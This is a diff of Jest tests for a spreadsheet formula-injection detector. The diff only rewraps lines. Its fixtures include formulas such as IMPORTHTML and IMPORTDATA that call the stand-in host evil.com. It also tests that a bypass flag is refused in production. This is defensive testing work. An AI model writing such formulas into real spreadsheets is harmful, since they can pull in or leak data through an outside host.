@@ -33,9 +33,7 @@ describe('Formula injection — dangerous formulas are blocked', () => {
   ];
 
   it.each(DANGEROUS)('blocks %s (%s)', (formula) => {
-    const violation = detectMutationSafetyViolation(
-      makeArgs('write', { values: [[formula]] })
-    );
+    const violation = detectMutationSafetyViolation(makeArgs('write', { values: [[formula]] }));
     expect(violation).not.toBeNull();
     expect(violation?.path).toBeTruthy();
     expect(violation?.preview.length).toBeGreaterThan(0);
@@ -60,9 +58,7 @@ describe('Formula injection — safe payloads are allowed', () => {
   ];
 
   it.each(SAFE)('allows %s (%s)', (value) => {
-    const violation = detectMutationSafetyViolation(
-      makeArgs('write', { values: [[value]] })
-    );
+    const violation = detectMutationSafetyViolation(makeArgs('write', { values: [[value]] }));
     expect(violation).toBeNull();
   });
 });
@@ -108,9 +104,7 @@ describe('Formula injection — nested key scanning', () => {
   it('catches injection in deeply nested batch_write values', () => {
     const v = detectMutationSafetyViolation(
       makeArgs('batch_write', {
-        data: [
-          { range: 'A1', values: [['normal', '=IMPORTHTML("https://evil.com","table",0)']] },
-        ],
+        data: [{ range: 'A1', values: [['normal', '=IMPORTHTML("https://evil.com","table",0)']] }],
       })
     );
     expect(v).not.toBeNull();
@@ -150,9 +144,7 @@ describe('Formula injection — safety bypass controls', () => {
     process.env['NODE_ENV'] = 'production';
     try {
       expect(() =>
-        detectMutationSafetyViolation(
-          makeArgs('write', { values: [['=IMPORTDATA("x")']] })
-        )
+        detectMutationSafetyViolation(makeArgs('write', { values: [['=IMPORTDATA("x")']] }))
       ).toThrow('SERVAL_ALLOW_FORMULA_PASSTHROUGH cannot be enabled in production');
     } finally {
       process.env['SERVAL_ALLOW_FORMULA_PASSTHROUGH'] = originalEnv ?? '';
@@ -208,16 +200,12 @@ describe('Formula injection — edge cases', () => {
     }
     // At depth > 12 the scanner bails — this specific deep nesting won't fire
     // (intentional DoS prevention for huge payloads)
-    expect(() =>
-      detectMutationSafetyViolation(makeArgs('write', nested))
-    ).not.toThrow();
+    expect(() => detectMutationSafetyViolation(makeArgs('write', nested))).not.toThrow();
   });
 
   it('truncates long formula previews at 60 characters', () => {
     const longFormula = '=IMPORTDATA("https://evil.com/' + 'x'.repeat(100) + '")';
-    const v = detectMutationSafetyViolation(
-      makeArgs('write', { values: [[longFormula]] })
-    );
+    const v = detectMutationSafetyViolation(makeArgs('write', { values: [[longFormula]] }));
     expect(v).not.toBeNull();
     expect(v!.preview.length).toBeLessThanOrEqual(60);
     expect(v!.preview.endsWith('...')).toBe(true);
